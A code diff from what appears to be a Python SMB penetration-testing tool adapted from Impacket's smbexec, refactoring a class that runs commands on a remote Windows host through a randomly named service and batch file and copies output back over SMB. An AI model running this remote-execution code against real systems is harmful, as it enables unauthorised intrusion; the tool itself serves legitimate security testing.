@@ -7,71 +7,8 @@ from lib.common import *
 ################################################################
 # Code borrowed and adapted from Impacket's smbexec.py example #
 ################################################################
-class SMBServer(Thread):
-    def __init__(self):
-        Thread.__init__(self)
-        self.__smbserver_dir = 'svcshell'
-        self.__smbserver_share = 'KEIMPX'
-
-    def cleanup_server(self):
-        logger.debug('Cleaning up local SMB server..')
-        os.unlink(self.__smbserver_dir + '/smb.log')
-        os.rmdir(self.__smbserver_dir)
-
-    def run(self):
-        # Here we write a mini config for the server
-        smbConfig = ConfigParser.ConfigParser()
-        smbConfig.add_section('global')
-        smbConfig.set('global','server_name','server_name')
-        smbConfig.set('global','server_os','UNIX')
-        smbConfig.set('global','server_domain','WORKGROUP')
-        smbConfig.set('global','log_file',self.__smbserver_dir + '/smb.log')
-        smbConfig.set('global','credentials_file','')
-
-        # Let's add a dummy share
-        smbConfig.add_section(self.__smbserver_share)
-        smbConfig.set(self.__smbserver_share,'comment','')
-        smbConfig.set(self.__smbserver_share,'read only','no')
-        smbConfig.set(self.__smbserver_share,'share type','0')
-        smbConfig.set(self.__smbserver_share,'path',self.__smbserver_dir)
-
-        # IPC always needed
-        smbConfig.add_section('IPC$')
-        smbConfig.set('IPC$','comment','')
-        smbConfig.set('IPC$','read only','yes')
-        smbConfig.set('IPC$','share type','3')
-        smbConfig.set('IPC$','path')
-
-        self.smb = smbserver.SMBSERVER(('0.0.0.0', 445), config_parser = smbConfig)
-
-        logger.debug('Creating tmp directory')
-
-        try:
-            os.mkdir(self.__smbserver_dir)
-        except Exception, e:
-            print e
-            pass
-
-        logger.info('Setting up SMB Server')
-        self.smb.processConfigFile()
-        logger.debug('Ready to listen...')
-
-        try:
-            self.smb.serve_forever()
-        except:
-            pass
-
-    def stop(self):
-        self.cleanup_server()
-        self.smb.socket.close()
-        self.smb.server_close()
-        self._Thread__stop()
-
-################################################################
-# Code borrowed and adapted from Impacket's smbexec.py example #
-################################################################
 class SvcShell(cmd.Cmd):
-    def __init__(self, svc, mgr_handle, rpc, mode='SHARE', display=True):
+    def __init__(self, svc, mgr_handle, rpc, smbserver_share, mode='SHARE', display=True):
         cmd.Cmd.__init__(self)
 
         self.__svc = svc
@@ -79,16 +16,15 @@ class SvcShell(cmd.Cmd):
         self.__rpc = rpc
         self.__mode = mode
         self.__display = display
-        self.__output_file = '%s.txt' % ''.join([random.choice(string.letters) for _ in range(8)])
+        self.__smbserver_share = smbserver_share
+        self.__output_file = '%s.txt' % ''.join(random.choice(string.letters) for _ in range(8))
         self.__output_file_path = ntpath.join(DataStore.share_path, self.__output_file)
         self.__batch_filename = '%s.bat' % ''.join([random.choice(string.letters) for _ in range(8)])
         self.__batchFile = ntpath.join(DataStore.share_path, self.__batch_filename)
-        self.__smbserver_dir = 'svcshell'
-        self.__smbserver_share = 'KEIMPX'
         self.__outputBuffer = ''
         self.__command = ''
         self.__shell = '%COMSPEC% /Q /c'
-        self.__service_name = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')
+        self.__service_name = ''.join([random.choice(string.ascii_lowercase) for _ in range(8)])
 
         self.transferClient = self.__rpc.get_smb_connection()
 
@@ -96,8 +32,8 @@ class SvcShell(cmd.Cmd):
         self.transferClient.setTimeout(100000)
 
         if self.__mode == 'SERVER':
-            myIPaddr = self.transferClient.getSMBServer().get_socket().getsockname()[0]
-            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output_file_path, myIPaddr, self.__smbserver_share)
+            self.__local_ip = self.transferClient.getSMBServer().get_socket().getsockname()[0]
+            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output_file_path, self.__local_ip, self.__smbserver_share)
 
     def __output_callback(self, data):
         self.__outputBuffer += data
@@ -134,17 +70,14 @@ class SvcShell(cmd.Cmd):
 
     def get_output(self):
         if self.__mode == 'SERVER':
-            fd = open(self.__smbserver_dir + '/' + self.__output_file,'r')
+            fd = open(os.path.join(tempfile.gettempdir(), self.__output_file), 'r')
             self.__output_callback(fd.read())
             fd.close()
-
-            try:
-                os.unlink(self.__smbserver_dir + '/' + self.__output_file)
-            except:
-                pass
+            os.unlink(os.path.join(tempfile.gettempdir(), self.__output_file))
         else:
             self.transferClient.getFile(DataStore.writable_share, self.__output_file, self.__output_callback)
-            self.transferClient.deleteFile(DataStore.writable_share, self.__output_file)
+
+        self.transferClient.deleteFile(DataStore.writable_share, self.__output_file)
 
     def execute_command(self, command):
         command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output_file_path, self.__batchFile, self.__shell, self.__batchFile)
